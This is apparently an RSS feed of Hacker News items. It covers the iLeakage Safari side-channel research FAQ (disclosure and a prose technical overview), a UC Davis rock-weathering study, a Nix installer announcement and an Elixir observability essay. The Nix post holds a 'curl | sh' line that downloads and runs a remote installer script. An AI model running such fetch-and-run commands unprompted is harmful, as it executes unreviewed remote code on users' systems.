										<br><code>defaults write com.apple.SafariTechnologyPreview IncludeInternalDebugMenu 0</code>
									</li>
								</ul>
							</div>
					<div id="panelsStayOpen-collapseDetect" aria-labelledby="panelsStayOpen-headingDetect">
							<p>
								iLeakage is highly unlikely to be detected, since the attack runs in Safari and does not
								leave traces in the system's log files. However, traces of an attacker webpage hosting
								iLeakage may be present in the browser's cache of pages it has recently visited.
							</p>
						</div>
					<div id="panelsStayOpen-collapseAbuse" aria-labelledby="panelsStayOpen-headingAbuse">
							<p>
								So far, we do not have evidence that iLeakage has been or not been abused. However, we
								note that iLeakage is a significantly difficult attack to orchestrate end-to-end, and
								requires advanced knowledge of browser-based side-channel attacks and Safari's
								implementation.
							</p>
						</div>
					<div id="panelsStayOpen-collapseStopPassword" aria-labelledby="panelsStayOpen-headingStopPassword">
							<p>
								Not for the most part. In fact, we encourage using credential managers as opposed to
								trying to remember all of your passwords. In general, this is a better approach
								than reusing passwords or storing them insecurely. While iLeakage can recover
								credentials that are autofilled into a webpage, we note that many platforms require user
								interaction for autofill to occur.
							</p>
						</div>
					<div id="panelsStayOpen-collapseNotify" aria-labelledby="panelsStayOpen-headingNotify">
							<p>
								We disclosed our results to Apple on September 12, 2022 (408 days before public release).
							</p>
						</div>
				</div>

				<p>
					<h5>For Tech-Savvy Readers</h5>
				</p>
				<div id="technical-details">
					<div id="panelsStayOpen-collapseJS" aria-labelledby="panelsStayOpen-headingJS">
							<p>
								JavaScript and WebAssembly are two programming languages that make up the backbone of
								interactive webpages, such as online games and video streaming services. JavaScript can
								update the content of the website directly, while WebAssembly is used for
								high-performance web applications. Ultimately, WebAssembly interfaces with JavaScript to
								deliver dynamic content to users. Since both are sandboxed in a browser environment,
								side-channel attacks are notably more difficult to implement in these languages.
								However, the impact is drastically greater, as browsers execute both types of code
								automatically and do not require the user to download the malicious program.
							</p>
						</div>
					<div id="panelsStayOpen-collapseSidechannel" aria-labelledby="panelsStayOpen-headingSidechannel">
								<p>
									Most computer bugs arise from mistakes in programming, such as missing bounds checks
									or use-after-frees. However, a side-channel attack exploits the implementation of a
									computer system to attack it, even if the program it runs is a secure algorithm.
									Systems can leak sensitive data through sound, electromagnetic radiation, or thermal
									throttling, just for a few examples.
								</p>
								<p>
									Many side channels, including ones we use for iLeakage, comes from the CPU's
									microarchitecture.
									Whenever an attacker and target run on the same CPU, they share the CPU's internal
									resources such as cores, caches, and internal buffers.
									Sharing resources leads to contention, and contention can be measured indirectly
									through several variables like timing or power consumption.
									These measurements leave fingerprints on the target's behavior on the CPU.
									Accordingly, an attacker can abuse this to make inferences about the target's
									secrets even if they are isolated at the process level or the hypervisor level.
								</p>
							</div>
					<div id="panelsStayOpen-collapseSpectre" aria-labelledby="panelsStayOpen-headingSpectre">
								<p>
									Virtually all modern CPUs use a performance optimization where they predict if a
									branch instruction will be taken or not, should the outcome not be readily
									available. Once a prediction is made, the CPU will execute instructions along the
									prediction, a process called speculative execution. If the CPU realizes it had
									mispredicted, it must revert all changes in the state it performed after the
									prediction. Both desktop and mobile CPUs exhibit this behavior, regardless of
									manufacturer (such as Apple, AMD, or Intel).
								</p>
								<p>
									<a href="https://spectreattack.com/">Spectre</a> is a hardware vulnerability in
									virtually all modern CPUs that occurs when speculative execution backfires. While
									the CPU should ideally revert all changes in state, speculative execution leaves
									traces in the CPU's microarchitectural state and especially the cache. A Spectre
									attack coerces the CPU into speculatively executing the wrong flow of instructions.
									If this wrong flow has instructions depending on sensitive data, their value can be
									inferred through a side channel even after the CPU realizes the mistake and reverts
									its changes. An adversary can abuse this behavior to read data that they cannot
									normally access through program semantics. Because speculative execution is an
									important part of CPU performance that is infeasible to simply remove as a
									countermeasure, Spectre continues to be dangerous to software even years after its
									discovery.
								</p>
							</div>
					<div id="panelsStayOpen-collapseDifference" aria-labelledby="panelsStayOpen-headingDifference">
								<p>
									Since the original <a href="https://spectreattack.com/">Spectre</a> exploit, browser
									vendors had significantly hardened browsers against attacks based on speculative and
									transient execution. For the case of Safari, this includes 35-bit addressing and the
									value poisoning, one process per tab isolation policy, as well as a low resolution
									timer.
								</p>
								<p>
									Nonetheless, iLeakage is the first demonstration of a speculative execution attack
									against <a href="https://en.wikipedia.org/wiki/Apple_silicon">Apple Silicon</a> CPUs
									and the Safari browser.
									In particular, we show that speculative execution attacks are possible on Apple's
									latest A-series and M-series architectures, despite Apple's side channel hardening.
									More specifically, we first devise an empirical method to recover the cache
									organization of Apple CPUs, since it is not publicly documented. We then use this
									information to develop a gadget that can distinguish cache hits from misses even in
									the absence of a cycle-accurate timer, which is the case for both native and browser
									environments for Apple devices. We use this gadget as both a test to generate cache
									eviction sets and as a covert channel. Finally, we migrate these techniques to the
									Safari browser, where we make Safari run code designed for one datatype on our
									maliciously crafted object of the wrong type while the CPU is performing speculative
									execution. Ultimately, we achieve a out-of-bounds read anywhere in the address space
									of Safari's rendering process.
								</p>
							</div>
					<div id="panelsStayOpen-collapseWorks" aria-labelledby="panelsStayOpen-headingWorks">
							<p>
									In order to construct iLeakage, we first reverse engineer the cache topology on <a href="https://en.wikipedia.org/wiki/Apple_silicon">Apple Silicon</a> CPUs.
									We then overcome Apple's timer limitations using a new speculation-based gadget, which allows us
									to distinguish individual cache hits from cache misses, despite having access to only low
									resolution timers. We also demonstrate a variant of this gadget that uses no timers, leveraging
									race conditions instead.
									After using our speculation-based gadget to construct eviction sets, we
									proceded to analyze Safari's side channel resilience. Here, we bypass Safari's 35-bit addressing
									and the value poisoning countermeasures, creating a primitive that can speculatively read and
									leak any 64-bit pointer within Safari's rendering process. Combining this with a new method for
									consolidating websites from different domains into the same address space, we are able to mount
									a speculative type confusion attack that leaks sensitive information.
								</p>
						</div>
					<div id="panelsStayOpen-collapsePaper" aria-labelledby="panelsStayOpen-headingPaper">
							<p>
									The download button at the top of this website links to an academic paper, also
									available through this <a href="https://ileakage.com/files/ileakage.pdf">link.</a>
									Our paper will appear at the 2023 ACM Conference on Computer and Communications
									Security (CCS).
								</p>
						</div>
				</div>

				<p>
					<h5>Miscellaneous</h5>
				</p>
				<div id="miscellaneous">
					<div id="panelsStayOpen-collapseOther" aria-labelledby="panelsStayOpen-headingOther">
								<p>
									On macOS, other popular browsers such as Chrome, Firefox and Microsoft Edge use
									different JavaScript engines. Since iLeakage exploits idiosyncrasies in Safari's
									JavaScript engine, these nuances suffice to deter iLeakage from working on them.
								</p>
								<p>
									However, iOS has a different situation. Due to Apple's App Store and sandboxing
									policies, other browser apps are forced to use Safari's JavaScript engine. That is,
									Chrome, Firefox and Edge on iOS are simply wrappers on top of Safari that provide
									auxiliary features such as synchronizing bookmarks and settings. Consequently,
									nearly every browser application listed on the App Store is vulnerable to iLeakage.
								</p>
							</div>
					<div id="panelsStayOpen-collapseLogo" aria-labelledby="panelsStayOpen-headingLogo">
							<p>
									Yes, we have <a href="https://ileakage.com/img/ileakage.svg">SVG</a> and <a href="https://ileakage.com/img/ileakage.png">PNG</a> versions of the iLeakage logo. While the logo
									contains a modified version of the Safari logo, we note the Safari logo is in the
									public domain at <a href="https://commons.wikimedia.org/wiki/File:Safari_browser_logo.svg">Wikimedia
										Commons</a>. Furthermore, it is not on Apple's list of <a href="https://www.apple.com/legal/intellectual-property/trademark/appletmlist.html">trademarks.</a>
								</p>
						</div>
				</div>

			</section>
			<section id="acknowledgments">
				<h4><i></i>Acknowledgments</h4>
				<div><p>
						This research was supported by
						the Air Force Office of Scientific Research (AFOSR) under award number FA9550-20-1-0425;
						an ARC Discovery Project number DP210102670;
						the Defense Advanced Research Projects Agency (DARPA) under contract HR00112390029 and
						W912CG-23-C-0022;
						the Deutsche Forschungsgemeinschaft (DFG, German Research Foundation) under Germany's Excellence
						Strategy - EXC 2092 CASA - 390781972;
						the National Science Foundation under grant CNS-1954712;
						and gifts by Cisco and Qualcomm.
						</p><p>
						
						The views and conclusions contained in this website are those of the authors and
						should not be interpreted as representing the official policies,
						either expressed or implied, of the U.S. Government.
						</p><p>
						
						Parts of this work were undertaken while Yuval Yarom was affiliated with the University of
						Adelaide.
					</p></div>
			</section>
		</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Adding crushed rock to farmland pulls carbon out of the air (253 pts)]]></title>
            <link>https://www.ucdavis.edu/climate/news/adding-crushed-rock-farmland-pulls-carbon-out-air</link>
            <guid>38015169</guid>
            <pubDate>Wed, 25 Oct 2023 17:08:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.ucdavis.edu/climate/news/adding-crushed-rock-farmland-pulls-carbon-out-air">https://www.ucdavis.edu/climate/news/adding-crushed-rock-farmland-pulls-carbon-out-air</a>, See on <a href="https://news.ycombinator.com/item?id=38015169">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><span><span>Adding crushed volcanic rock to cropland could play a key role in removing carbon from the air. In a field study, scientists at the University of California, Davis, and Cornell University found the technology stored carbon in the soil even during an extreme drought in California. The <a href="https://iopscience.iop.org/article/10.1088/2515-7620/acfd89/meta">study</a> was published in the journal Environmental Research Communications.</span></span></p>

<p><span><span>Rain captures carbon dioxide from the air as it falls and reacts with volcanic rock to lock up carbon. The process, called rock weathering, can take millions of years — too slow to offset global warming. But by crushing the rock into a fine dust, rock weathering speeds up. Previous <a href="https://agupubs.onlinelibrary.wiley.com/doi/10.1029/2023EF003698">studies</a> have estimated this “enhanced” rock weathering could store 215 billion tons of carbon dioxide over the next 75 years if spread across croplands globally.</span></span></p>

<p><span><span>But until now the technology hasn’t been field-tested in dry climates. </span></span></p>

<p><span><span>“These reactions require water,” said lead author Iris Holzer, a doctoral candidate in soils and biogeochemistry in the Department of Land, Air and Water Resources at UC Davis. “Since we’re interested in the global carbon storage potential of enhanced weathering, we need to understand if it can work in these drier climates and if different measurement approaches are effective. We were excited to observe carbon removal in this environment.”</span></span></p>

<h2><span><span><strong>California as a test case for storing carbon</strong></span></span></h2>

<p><span><span>Researchers applied crushed rock, both metabasalt and olivine, on 5 acres of a fallowed cornfield in the Sacramento Valley. They collected measurements during the winter months of 2020-2021. California was experiencing extreme drought at the time, with rainfall at 41% of its historical average. </span></span></p>

<layout-columns columns="1" cwidth="overflow"><div slot="column1">
	<figure role="group"><p><img loading="lazy" src="https://www.ucdavis.edu/sites/default/files/media/images/DSC_8875_edited.jpg" width="2000" height="1125" alt="A spreader unloads crushed metabasalt rock on a fallowed corn field in the Central Valley. (Amy Quinton/ UC Davis)" typeof="foaf:Image"></p>
<figcaption>A spreader unloads crushed metabasalt rock on a fallowed corn field in the Central Valley. (Amy Quinton/ UC Davis)</figcaption></figure></div>

	

	

	
</layout-columns><p><span><span>The study found the plots with crushed rock stored 0.15 tons of carbon dioxide per hectare (2.47 acres) during the study compared to plots without crushed rock. Though researchers expect different weathering rates in different environments, if this amount of carbon was removed across all California cropland, it would be equivalent to taking 350,000 cars off the road every year.</span></span></p>

<p><span><span>“We’re definitely seeing evidence of weathering processes taking place on short time scales,” said Holzer. “Even the infrequent heavy rains we get in the West might be enough to drive enhanced rock weathering and remove carbon dioxide.”</span></span></p>

<p><span><span>Holzer said measuring and verifying that carbon storage at larger scales and following it over time is the next challenge. </span></span></p>

<p><span><span>Forty-one percent of Earth’s land surface is covered by drylands that are expanding due to climate change. Researchers said this makes investigating enhanced rock weathering in drylands increasingly important.</span></span></p>

<p><span><span>“When it comes to bending the global carbon curve, we are in a race against time,” said senior author Benjamin Z. Houlton, Ronald P. Lynch Dean of the Cornell University College of Agriculture and Life Sciences. “Our study demonstrates a new way to verify carbon dioxide removal via enhanced weathering, which is a critical leap forward for scaling this technology in croplands worldwide.”</span></span></p>

<p><span><span>Other authors include Mallika Nocco, in the Department of Land, Air and Water Resources at UC Davis. </span></span></p>

<p><span><span>The research, part of the Working Lands Innovation Center, was funded by the California Strategic Growth Council and the Grantham Foundation, Roger Sant and Doris Matsui. Aggregates and mining company, SGI, a Standard Industries company, donated the crushed metabasalt rock from its site in Ione, California. </span></span></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Nix Survival Mode: macOS upgrades won't break Nix anymore (111 pts)]]></title>
            <link>https://determinate.systems/posts/nix-survival-mode-on-macos</link>
            <guid>38015106</guid>
            <pubDate>Wed, 25 Oct 2023 17:05:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://determinate.systems/posts/nix-survival-mode-on-macos">https://determinate.systems/posts/nix-survival-mode-on-macos</a>, See on <a href="https://news.ycombinator.com/item?id=38015106">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-v-7905ebcc=""><p data-v-5504712b="">Tens of thousands of macOS users install Nix using the <a target="_blank" href="https://github.com/DeterminateSystems/nix-installer" data-v-56a74208="" data-v-856a1b8f="">Determinate Nix Installer</a>, and I'm one of them.
Last February, <a target="_blank" href="https://determinate.systems/posts/determinate-nix-installer" data-v-56a74208="" data-v-856a1b8f="">we introduced the Determinate Nix Installer</a> to solve a multitude of reliability problems and failure conditions.
This has been a rousing success, but we always aspire to reduce friction and improve the user experience.
Our goal is 100% success, with zero fuss.</p>
<p data-v-5504712b="">Despite a rounding error of install-time failures, hilariously, most Nix installations are broken after macOS upgrades.
Not great: this is not the user experience we're going for!
People usually like software better when it stays installed, and you'd think Nix -- striving for predictability -- wouldn't do this.</p>
<p data-v-5504712b="">Well, good news:
<strong data-v-16388f31="">Nix installations from the Determinate Nix Installer after version v0.14 survive macOS upgrades.</strong> 🎉</p>
<p data-v-5504712b="">The latest release of our installer now creates a global Launch Daemon which restores the necessary pieces of Nix's installation at boot time.</p>
<p data-v-5504712b="">That means the Nix you installed stays installed, eliminating the largest source of friction for macOS users and demonstrating our commitment to being the most reliable, resilient, and safest way to install Nix.</p>
<p data-v-5504712b="">Try it on your mac today:</p>
<div data-lang="shell"><pre><code><span>curl</span> <span>--proto</span> <span>'=https'</span> <span>--tlsv1.2</span> <span>-sSf</span> <span>-L</span> https://install.determinate.systems/nix <span>|</span> <span>sh</span> <span>-s</span> -- <span>install</span></code></pre></div>
<p data-v-5504712b="">or integrate the most reliable Nix installer in GitHub Actions:</p>
<div data-lang="yaml"><pre><code><span>-</span> <span>uses</span><span>:</span> DeterminateSystems/nix<span>-</span>installer<span>-</span>action@main</code></pre></div>
<div data-v-e1981f11=""><h2 data-v-e1981f11="">Our position on stable flakes</h2><p data-v-e1981f11=""><a href="https://determinate.systems/" data-v-e1981f11="">Nix flakes</a> are currently marked "experimental" in the Nix project. Our position as a company is that the on-the-ground experience of actually <em data-v-e1981f11="">using</em> flakes has been quite stable for some time and that you should consider flakes stable and start using them today. </p><p data-v-e1981f11=""> You can read more about our position <a href="https://determinate.systems/posts/experimental-does-not-mean-unstable" data-v-e1981f11="">here on our blog</a>. </p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Unpacking Elixir: Observability (161 pts)]]></title>
            <link>https://underjord.io/unpacking-elixir-observability.html</link>
            <guid>38015038</guid>
            <pubDate>Wed, 25 Oct 2023 17:01:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://underjord.io/unpacking-elixir-observability.html">https://underjord.io/unpacking-elixir-observability.html</a>, See on <a href="https://news.ycombinator.com/item?id=38015038">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
        
        <small>2023-10-02</small>
        <p>Elixir supports the usual supects of observability. Open Telemetry (OTel), log handlers, capturing metrics. And it does it well. This post will mostly focus on the observability you have on the BEAM that is either incredibly rare to see elsewhere or possibly entirely unique.</p>
<p>The previous posts on <a href="https://underjord.io/unpacking-elixir-concurrency.html">concurrency</a> and <a href="https://underjord.io/unpacking-elixir-resilience.html">resilience</a> might give useful context around how processes work and how supervision trees are structured. I will try not to lean too heavily on them but if you feel the need to understand more, consider reading them.</p>
<p>I don’t know if my understanding is accurate to the truth of the system, I don’t read BEAM bytecode, but I’ll take a stab. Elixir and Erlang applications do not change their shape very mnuch in compilation. I imagine the VM-level code still has an understanding of the fundamental parts of the language we see. Modules. Functions. It certainly knows about processes, messages, mailboxes and all that.</p>
<p>Why would someone build it this way? It has to be fundamentally inefficient compared to say .. C++ or Rust. Your compiled C or C++ program will be very different from the code you wrote. Who knows what the compiler will feel like doing. It will be semantically equivalent, the meaning of how the code executes will be retained. There is a ton of additional debugging information required if you want to retain the human-readable meaning and ideas of the original code during execution of the end product. And that might be enough to give you a nice stack trace.</p>
<p>Elixir aside, other high-level dynamic languages also seem to keep more of their general structure. If the program can mutate itself significantly during runtime it limits how much the compiler can be allowed to mangle things.</p>
<p>Erlang was built to provide hot code updates. I think this is the fundamental reason it is so introspectable at runtime. Hot code updates, while they can be done rigorously and should be treated seriously for production systems, is essentially the biggest monkey patch facility imaginable. I guess any language that can patch itself at runtime could start implementing hot code updates. But Erlang is designed to allow it and do it gracefully. This significantly limits how much the compiler can be allowed to boil things away.</p>
<p>Let’s start with the tool that Elixir devs tend to use daily. The REPL, the shell, iEx. It is a great part of the developer workflow as is. More importantly though, if you package an Erlang Release of your project you also end up with <code>my_app remote</code>. This command pops an iex shell, connects to your app over Erlang distribution and lets you poke your application. It lets you operate your application. All your modules and functions are intact and you can just make function calls, send messages and generally poke and prod around in your cluster. Whatever you need, anything that’s available in Erlang and Elixir plus any new code your a willing to type or paste into the interpreter.</p>
<p>What facilities do we have to actually pull information from the system? Well. The Erlang <code>sys.get_state/1</code> function lets you pull the state of an “Actor”-style process (GenServer, GenStage, gen_event, gen_statem, etc) which is usually all of them. If they are part of how Erlang runs supervision trees by implementing those protocols it should also be able to give you the state it is holding. So you can inspect the running state of your application down to the studs.</p>
<p>Elixir offers <code>Process.list/0</code> to get a plain list of all the process IDs (PIDs) on the local node. With this you can do <code>Process.info/1</code> to find out what is going on and investigate things like memory usage, reduction count (number of function calls), initial function call and much more. All things that are part of the Erlang protocol for a well-behaved process.</p>
<p>This is all underpinnings for higher-level tools such as Erlang’s fun desktop UI app <code>observer</code> which can show you a graph of your supervision tree. It also has an activity monitor for your processes (order by memory used descending, oh there’s the memory leak). You can kill processes, you can get system-level stats. It has a bit of everything.</p>
<p>Of course with LiveView coming to Elixir this was pushed a bit further. A default Phoenix app has a few lines to uncomment to enable LiveDashboard which is a view that gives you much of the same information as observer. Plus it collects some telemetry for Phoenix and Ecto. You also get system-level information (disk, RAM, CPU), BEAM-level information (memory allocation types, resource usage, schedulers running) and a bit more. You also get a Process listing here in a nice and neat web view. If you are new in Elixir and want to make some waves I think pushing LiveDashboard further would be a good place to poke around. It is already a very cool start.</p>
<p>I believe LiveDashboard established this pattern for libraries with web UI for Phoenix. It provides a plug. Meaning you can shove it in any part of your router that you like. Usually behind an admin access check. I’ve since seen this done with Oban (job processing library) web UI and I believe the same thing is done with Orion.</p>
<p>Let’s talk about Orion because it feeds right into this story. It is a recent development by Thomas Depierre. Dubbed as a Dynamic Distributed Profiler it does something that requires a lot of instrumentation to do in any ecosystem and which is probably impossible to do fully in some. It was entirely achieved with existing Erlang facilities. You can enter a module name, a function name and an arity, hit Run. It will start to capture the performance of that function being called across your entire cluster. It then graphs that and gives you data and statistics on how that function is performing. There are many cool directions to extend this tool, let’s get into what it was built on. Tracing.</p>
<p>Tracing in Erlang is a mechanism for capturing information around the execution of a function. It is not limited to performance numbers. I’ve used both raw Erlang <code>dbg</code>, the convenience library <code>recon</code> and a little bit of <code>recon_ex</code> to do tracing on production systems when I needed to figure something out. I don’t know of any other runtime or langugae that makes this possible. Maybe I’m missing a world of tools in different ecosystems. Let me know. But essentially you formulate a type of pattern match for which invocations of the function you want to capture and in what way. Typically I want the inputs and the outputs along with execution time.</p>
<p>Think about this for a moment. If you have a function that seems to end up getting called with the wrong value, probably nil, for some unclear reason. And of course only in production. You can, in a reasonable manner, set up a trace and either wait for the thing to happen or trigger the behavior. Then you just watch the answers come in.</p>
<p>Oh, you need to know what happens one function deeper? Set another trace. There are limits and considerations for how much tracing you should do at once but you have a lot of room to play. Most of the tools built on top of the Erlang primitives try to protect you a bit from overloading your system with trace messages.</p>
<p>There are so many tools that haven’t even been built on top of this yet. I don’t think most Elixir developers are even aware that it is possible. There is no particular reason you couldn’t trigger an automatic trace after a new type of error surfaces and try to capture more info on the next run, ship that to your devs. Or build a UI for picking modules, functions and args to match so that you can capture these traces. If you want you could probably adapt the results to go into your Open Telemetry trace storage. There is a world to explore here.</p>
<p>And to some it won’t be available at all. If you run your stuff on Heroku and don’t add some tool for accessing a shell through the web or something you might have no way of reaching your server to pop the shell.</p>
<p>I should have asked for a <a href="https://fly.io/">Fly</a> sponsorship here. This stuff is why I’m excited about their platform. Wireguard private networking by default makes clustering much easier. It also makes connecting to servers simpler which means getting at an iex shell straightforward.</p>
<p>You could replicate most of it with Tailscale or if you really want to work for it, custom wireguard stuff. Either way, Fly is a very good match for Elixir. It makes sense that they anchor their presence in the Elixir ecosystem by funding Chris McCord’s work on LiveView. Their infra offering just fits so well. A bunch of asterisks on the maturity of the offering still remain and they’ve owned up to that. Feature-wise I really like it.</p>
<p>A regular VPS or dedicated server is also perfectly convenient to shell into.</p>
<p>This capability, especially with Wireguard networking, also allows you to connect a Livebook (collaborative code notebook for Elixir) to a running system. This lets you build a recipe-book of things you might want to do in your system. Some would call them playbooks or runbooks. Rather than writing ad-hoc code that will get lost in your terminal history you build up a toolset. I haven’t put this into practice but it should be perfectly feasible.</p>
<p>To revisit. The BEAM retains the shape of your application. You modules, your functions, they still exist. Your processes are not just abstractions that are flattened out by the compiler. They are real and exist, comparatively speaking. Erlang and OTP have protocols and systems in place that make it possible to observe the running system at a high level for an overview as well as dive in and inspect any particular part.</p>
<p>The unique nature of these incredibly dynamic systems warranted unusual solutions and that gave us the Erlang tracing facilities. It is not a wildly monkey-patching library from some APM provider. It is not a hack to interject into the operation of the software, it is a fundamental facility of the runtime.</p>
<p>Playing nice with existing ecosystems and standard practices such as Open Telemetry is important. Elixir and Erlang are used for serious stuff and in mixed environments. It can’t all be special, unique and quirky. And I think the telemetry handling, metrics libraries like PromEx and the OTel implementation make great use of the BEAM and do not require external tools to operate aside from where to store the data.</p>
<p>Then when you look at the stuff that really is special, unique and quirky there is immense potential. We can go beyond what is feasible in other runtimes and languages. I think this is a big space for innovation on top of Elixir, Erlang and the runtime. The tools I’ve seen in this area are still fairly simple and there is so much potential.</p>
<p>This is what you get working with a higher level of abstraction that had a deeper purpose. Here the abstraction is not just about convenience and syntax but a deeply worked design that serves larger objectives. Python is a high level of abstraction primarily to make a sleek and convenient language. I am not convinced that the design of the language and runtime had clearer objectives more elevated than nice and convenient syntax. That’s fine but it has long-term consequences.</p>
<p>I think observability and introspectability, of arbitrary parts of the system, at runtime, is one of those things that people don’t know or really think about with Erlang and Elixir. But the magic of the BEAM is in the runtime and at runtime. It always was.</p>
<hr>
<p>What would you want to see in observability? Am I missing fantastic contenders in other ecosystems? Let me know via email at <a href="mailto:lars@underjord.io">lars@underjord.io</a> or on the fedi <a href="https://twitter.com/lawik">@lawik</a>. I really enjoy exchanges with my readers.</p>

        <p>Note: If you like my writing you might appreciate my videos. Give them a go over on <a href="https://youtube.com/c/underjord">the YouTube
                channel</a>.</p>
    </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Advice to a novice programmer (102 pts)]]></title>
            <link>https://blog.plover.com/prog/katara-advice.html</link>
            <guid>38014879</guid>
            <pubDate>Wed, 25 Oct 2023 16:50:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.plover.com/prog/katara-advice.html">https://blog.plover.com/prog/katara-advice.html</a>, See on <a href="https://news.ycombinator.com/item?id=38014879">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

 <tbody><tr>

  <!-- left column -->
  <td>

   <p>
   <br>
   Mark Dominus (陶敏修)<br>
   <a href="mailto:mjd@pobox.com">mjd@pobox.com</a> <br>
   </p>

   <p>
   <img width="100" height="100" src="https://pic.blog.plover.com/TOP.jpg"><br>
   </p>

   <p>
   <a href="https://blog.plover.com/meta/about-me.html">About me</a>
   </p>

   <p>
   <a href="https://blog.plover.com/index.rss">RSS</a>
   <a href="https://blog.plover.com/index.atom">Atom</a>   </p>


   <p><a href="https://blog.plover.com/">12 recent entries</a><br>
  
</p>

   <p>Archive:<br><table>
<tbody><tr><td><a href="https://blog.plover.com/2023/">2023</a>:
    </td><td>J<a href="https://blog.plover.com/2023/02/">F</a><a href="https://blog.plover.com/2023/03/">M</a><a href="https://blog.plover.com/2023/04/">A</a><a href="https://blog.plover.com/2023/05/">M</a><a href="https://blog.plover.com/2023/06/">J</a>
</td></tr><tr><td>&nbsp;</td><td><a href="https://blog.plover.com/2023/07/">J</a><a href="https://blog.plover.com/2023/08/">A</a><a href="https://blog.plover.com/2023/09/">S</a><a href="https://blog.plover.com/2023/10/">O</a>
</td></tr><tr><td><a href="https://blog.plover.com/2022/">2022</a>:
    </td><td><a href="https://blog.plover.com/2022/01/">J</a><a href="https://blog.plover.com/2022/02/">F</a><a href="https://blog.plover.com/2022/03/">M</a><a href="https://blog.plover.com/2022/04/">A</a><a href="https://blog.plover.com/2022/05/">M</a><a href="https://blog.plover.com/2022/06/">J</a>
</td></tr><tr><td>&nbsp;</td><td><a href="https://blog.plover.com/2022/07/">J</a>A<a href="https://blog.plover.com/2022/09/">S</a><a href="https://blog.plover.com/2022/10/">O</a><a href="https://blog.plover.com/2022/11/">N</a><a href="https://blog.plover.com/2022/12/">D</a>
</td></tr><tr><td><a href="https://blog.plover.com/2021/">2021</a>:
    </td><td><a href="https://blog.plover.com/2021/01/">J</a><a href="https://blog.plover.com/2021/02/">F</a><a href="https://blog.plover.com/2021/03/">M</a><a href="https://blog.plover.com/2021/04/">A</a>M<a href="https://blog.plover.com/2021/05/">J</a>
</td></tr><tr><td>&nbsp;</td><td><a href="https://blog.plover.com/2021/07/">J</a><a href="https://blog.plover.com/2021/08/">A</a><a href="https://blog.plover.com/2021/09/">S</a><a href="https://blog.plover.com/2021/10/">O</a><a href="https://blog.plover.com/2021/11/">N</a><a href="https://blog.plover.com/2021/12/">D</a>
</td></tr><tr><td><a href="https://blog.plover.com/2020/">2020</a>:
    </td><td><a href="https://blog.plover.com/2020/01/">J</a><a href="https://blog.plover.com/2020/02/">F</a><a href="https://blog.plover.com/2020/03/">M</a><a href="https://blog.plover.com/2020/04/">A</a><a href="https://blog.plover.com/2020/05/">M</a><a href="https://blog.plover.com/2020/06/">J</a>
</td></tr><tr><td>&nbsp;</td><td><a href="https://blog.plover.com/2020/07/">J</a><a href="https://blog.plover.com/2020/08/">A</a><a href="https://blog.plover.com/2020/09/">S</a><a href="https://blog.plover.com/2020/10/">O</a><a href="https://blog.plover.com/2020/11/">N</a><a href="https://blog.plover.com/2020/12/">D</a>
</td></tr><tr><td><a href="https://blog.plover.com/2019/">2019</a>:
</td><td><a href="https://blog.plover.com/2019/01/">J</a>F<a href="https://blog.plover.com/2019/03/">M</a><a href="https://blog.plover.com/2019/04/">A</a><a href="https://blog.plover.com/2019/05/">M</a><a href="https://blog.plover.com/2019/06/">J</a>
</td></tr><tr><td>&nbsp;</td><td><a href="https://blog.plover.com/2019/07/">J</a><a href="https://blog.plover.com/2019/08/">A</a><a href="https://blog.plover.com/2019/09/">S</a><a href="https://blog.plover.com/2019/10/">O</a><a href="https://blog.plover.com/2019/11/">N</a><a href="https://blog.plover.com/2019/12/">D</a>
</td></tr><tr><td><a href="https://blog.plover.com/2018/">2018</a>:
</td><td><a href="https://blog.plover.com/2018/01/">J</a><a href="https://blog.plover.com/2018/02/">F</a><a href="https://blog.plover.com/2018/03/">M</a><a href="https://blog.plover.com/2018/04/">A</a><a href="https://blog.plover.com/2018/05/">M</a><a href="https://blog.plover.com/2018/06/">J</a>
</td></tr><tr><td>&nbsp;</td><td><a href="https://blog.plover.com/2018/07/">J</a><a href="https://blog.plover.com/2018/08/">A</a><a href="https://blog.plover.com/2018/09/">S</a><a href="https://blog.plover.com/2018/10/">O</a><a href="https://blog.plover.com/2018/11/">N</a><a href="https://blog.plover.com/2018/12/">D</a>
</td></tr><tr><td><a href="https://blog.plover.com/2017/">2017</a>:
</td><td><a href="https://blog.plover.com/2017/01/">J</a><a href="https://blog.plover.com/2017/02/">F</a><a href="https://blog.plover.com/2017/03/">M</a><a href="https://blog.plover.com/2017/04/">A</a><a href="https://blog.plover.com/2017/05/">M</a><a href="https://blog.plover.com/2017/06/">J</a>
</td></tr><tr><td>&nbsp;</td><td><a href="https://blog.plover.com/2017/07/">J</a><a href="https://blog.plover.com/2017/08/">A</a><a href="https://blog.plover.com/2017/09/">S</a><a href="https://blog.plover.com/2017/10/">O</a><a href="https://blog.plover.com/2017/11/">N</a><a href="https://blog.plover.com/2017/12/">D</a>
</td></tr><tr><td><a href="https://blog.plover.com/2016/">2016</a>:
</td><td>J<a href="https://blog.plover.com/2016/02/">F</a><a href="https://blog.plover.com/2016/03/">M</a><a href="https://blog.plover.com/2016/04/">A</a><a href="https://blog.plover.com/2016/05/">M</a><a href="https://blog.plover.com/2016/06/">J</a>
</td></tr><tr><td>&nbsp;</td><td><a href="https://blog.plover.com/2016/07/">J</a>ASO<a href="https://blog.plover.com/2016/11/">N</a><a href="https://blog.plover.com/2016/12/">D</a>
</td></tr><tr><td><a href="https://blog.plover.com/2015/">2015</a>:
</td><td>JF<a href="https://blog.plover.com/2015/03/">M</a><a href="https://blog.plover.com/2015/04/">A</a><a href="https://blog.plover.com/2015/05/">M</a><a href="https://blog.plover.com/2015/06/">J</a></td></tr><tr><td>&nbsp;</td><td><a href="https://blog.plover.com/2015/07/">J</a><a href="https://blog.plover.com/2015/08/">A</a><a href="https://blog.plover.com/2015/09/">S</a><a href="https://blog.plover.com/2015/10/">O</a><a href="https://blog.plover.com/2015/11/">N</a><a href="https://blog.plover.com/2015/12/">D</a>
</td></tr><tr><td><a href="https://blog.plover.com/2014/">2014</a>:
